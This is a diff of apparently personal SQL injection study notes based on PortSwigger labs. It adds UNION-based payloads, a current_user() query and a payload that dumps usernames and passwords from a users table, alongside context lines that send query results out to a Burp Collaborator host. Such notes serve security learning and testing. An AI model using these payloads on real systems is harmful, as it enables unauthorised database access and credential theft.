@@ -1,3 +1,10 @@
+# SQL injection 
+## Introduction 
+It is an attack in which an attacker inserts untrusted data in the application that results in revealing sensitive information of the database. 
+
+SQL Injection (SQLi) is a code injection attack where an attacker manipulates the data being sent to the server to execute malicious SQL statements to control a web application’s database server, thereby accessing, modifying and deleting unauthorized data. This attack is mainly used to take over database servers. 
+
+
 # Finding SQLi
 1. make list of all input fields that it's possible to talk to DB 
 	1. Authentication forms 
@@ -20,7 +27,7 @@
 2. Boolean => blind
 3. Error Based => blind 
 4. Out-Of-Band 
-5. Time Delay => blind 
+5. Time-Based => blind 
 
 
 ## UNION 
@@ -34,13 +41,16 @@ catergory=lifstyle' or 1=1# =>PostgreSQL, Mysql'
 ```sql
 catergory=lifstyle' order by 1 -- => 200 ? => continue '
 catergory=lifstyle' order by 2 -- => 200 ? => continue'
-catergory=lifstyle' order by 3 -- => 500 ? => there is only 2 cols being used 
+catergory=lifstyle' order by 3 -- => 500 ? => there is only 2 cols being used  '
+-- if in mysql 
+catergory=lifstyle' union select 1,2,3 --
 ```
 
 ### check for the col with string type
 ```SQL
 catergory=lifstyle' union select null,null,'a' -- => 500 ? => not the right col'
-catergory=lifstyle' union select null,'a',null -- => 200 ? => the right col
+catergory=lifstyle' union select null,'a',null -- => 200 ? => the right col ' 
+
 ```
 
 ### check for the DB type again
@@ -206,7 +216,16 @@ Cookie: TrackingId=fLnCztNur00UGAsB' || (`create OR replace function f() returns
 Cookie: TrackingId=fLnCztNur00UGAsB' || (SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a')) --'
 ```
 
-
-
+---
+---
+#### Finding usernames logged in
+##### Mysql
+```sql
+catergory=lifstyle' union select 1,2,current_user() --
+```
+#### Concatenate
+```sql
+catergory=lifstyle' union select 1,2,concat(username,":",password) from users --
+```
 ### References
 - https://portswigger.net/web-security/sql-injection/cheat-sheet
